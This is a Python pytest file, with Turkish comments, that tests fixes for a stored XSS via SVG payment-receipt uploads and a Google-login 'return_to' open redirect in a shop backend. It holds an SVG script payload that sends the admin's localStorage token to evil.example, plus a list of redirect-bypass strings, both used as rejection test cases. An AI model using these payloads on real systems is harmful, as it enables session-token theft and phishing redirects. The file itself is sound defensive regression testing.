"""E2E (istemci-tarafı güvenlik, 2026-10): müşteri dekontu üzerinden admin'e stored-XSS ve
Google girişi `return_to` açık yönlendirmesi.

1) Dekont (havale/EFT) yükleme ucu herkese açıktır; eskiden `image/*` olan HER tür kabul
   ediliyordu → müşteri `image/svg+xml` (ya da `image/x+xml`) türünde script'li bir SVG
   yükleyebiliyordu. Panel "Dekontu Gör" dosyayı yetkili istekle BLOB olarak çekip
   `blob:https://<vitrin>/…` adresinde açar: blob belgesi vitrin ORIGIN'inde çalışır,
   sunucunun `Content-Disposition`/`CSP: sandbox` başlıkları blob'a TAŞINMAZ → script admin
   oturumunun localStorage token'ını okuyabilirdi. Artık yalnız raster görsel/PDF türleri
   kabul edilir; işaretleme (markup) baytları reddedilir; eski (zaten kayıtlı) güvensiz tür
   `application/octet-stream` olarak indirilir.
2) `return_to` değeri "/\\evil.com" ya da "/\\t/evil.com" olabiliyordu; tarayıcı "\\" karakterini
   "/" sayıp TAB'ı yuttuğundan React Router'ın pushState'i SecurityError verip
   location.assign ile DIŞ siteye gidiyordu.
"""
import pytest

from pay_harness import pay_create_order, pay_find, pay_seed_product, pay_set, pay_staff, SHIP

pytestmark = pytest.mark.asyncio

SVG = (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
       b'<script>fetch("https://evil.example/?t="+localStorage.token)</script></svg>')
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64


async def _havale_order(http):
    await pay_seed_product("p1", stock=5)
    r = await pay_create_order(http, "bank_transfer")
    assert r.status_code == 200, r.text
    return await pay_find("orders", {"id": r.json()["order_id"]})


async def _upload(http, order, name, data, ctype):
    return await http.post(f"/api/orders/by-number/{order['order_number']}/payment-notification",
                           files={"file": (name, data, ctype)},
                           data={"contact": SHIP["email"], "note": "odedim"})


@pytest.mark.parametrize("name,data,ctype", [
    ("dekont.svg", SVG, "image/svg+xml"),
    ("dekont.svg", SVG, "image/svg+xml; charset=utf-8"),
    ("dekont.png", SVG, "image/x+xml"),          # "+xml" türü Chrome'da XML belgesi olarak çalışır
    ("dekont.png", SVG, "image/png"),            # tür yalan: baytlar işaretleme (markup)
    ("dekont.png", b"  \n" + SVG, "image/jpeg"),
    ("dekont.html", b"<html><script>1</script></html>", "text/html"),
])
async def test_markup_receipt_is_rejected(pay_http, pay_env, name, data, ctype):
    o = await _havale_order(pay_http)
    r = await _upload(pay_http, o, name, data, ctype)
    assert r.status_code == 400, (ctype, r.status_code, r.text)
    cur = await pay_find("orders", {"id": o["id"]})
    assert not cur.get("payment_receipt")
    assert cur["status"] == "awaiting_payment" and cur.get("payment_status") != "paid"


async def test_raster_and_pdf_receipts_still_accepted_and_inline(pay_http, pay_env):
    o = await _havale_order(pay_http)
    r = await _upload(pay_http, o, "dekont.png", PNG, "image/png")
    assert r.status_code == 200, r.text
    _, hdr = await pay_staff(["orders.view"])
    g = await pay_http.get(f"/api/orders/{o['id']}/payment-receipt", headers=hdr)
    assert g.status_code == 200 and g.content == PNG
    assert g.headers["content-type"].startswith("image/png")
    assert g.headers["content-disposition"].startswith("inline")
    # Tür boş/octet-stream gelirse uzantıdan tanıma (telefonlar) korunur.
    o2 = await _havale_order(pay_http)
    r = await _upload(pay_http, o2, "dekont.pdf", b"%PDF-1.4\n%%EOF", "application/octet-stream")
    assert r.status_code == 200, r.text
    assert (await pay_find("orders", {"id": o2["id"]}))["payment_receipt"]["content_type"] == "application/pdf"


async def test_legacy_svg_receipt_is_served_as_opaque_download(pay_http, pay_env):
    """Düzeltmeden ÖNCE kaydedilmiş güvensiz türdeki dekont: kayıt değiştirilmez (kullanıcı verisi),
    yalnız SUNUM güvenli yapılır — blob türü octet-stream olur, tarayıcı belge olarak çalıştırmaz."""
    from routes.orders import _encrypt_receipt_bytes, _RECEIPT_ENC_FORMAT
    o = await _havale_order(pay_http)
    for legacy_ct in ("image/svg+xml", "image/x+xml", "text/html"):
        await pay_set("orders", {"id": o["id"]}, {"payment_receipt": {
            "filename": "dekont.svg", "content_type": legacy_ct, "size": len(SVG),
            "data_enc": _encrypt_receipt_bytes(SVG), "enc_format": _RECEIPT_ENC_FORMAT}})
        _, hdr = await pay_staff(["orders.view"])
        g = await pay_http.get(f"/api/orders/{o['id']}/payment-receipt", headers=hdr)
        assert g.status_code == 200 and g.content == SVG
        assert g.headers["content-type"].startswith("application/octet-stream"), legacy_ct
        assert g.headers["content-disposition"].startswith("attachment")
        assert "sandbox" in g.headers.get("content-security-policy", "")
        assert g.headers.get("x-content-type-options") == "nosniff"
        # kayıt olduğu gibi kalır
        assert (await pay_find("orders", {"id": o["id"]}))["payment_receipt"]["content_type"] == legacy_ct


@pytest.mark.parametrize("value", [
    "/\\evil.example", "/\\/evil.example", "/\t/evil.example", "/\n/evil.example", "/\r/evil.example",
    "//evil.example", "https://evil.example", "\\\\evil.example", "/admin/../\\evil.example", "/x\x00y",
    "", "evil.example",
])
async def test_google_return_to_rejects_browser_normalised_external(value):
    from routes.auth import _safe_google_return_to
    assert _safe_google_return_to(value) == "/hesabim"


@pytest.mark.parametrize("value", ["/hesabim", "/urun/elbise-1?beden=M", "/sepet#odeme", "/kategori/%C3%A7anta"])
async def test_google_return_to_keeps_local_paths(value):
    from routes.auth import _safe_google_return_to
    assert _safe_google_return_to(value) == value
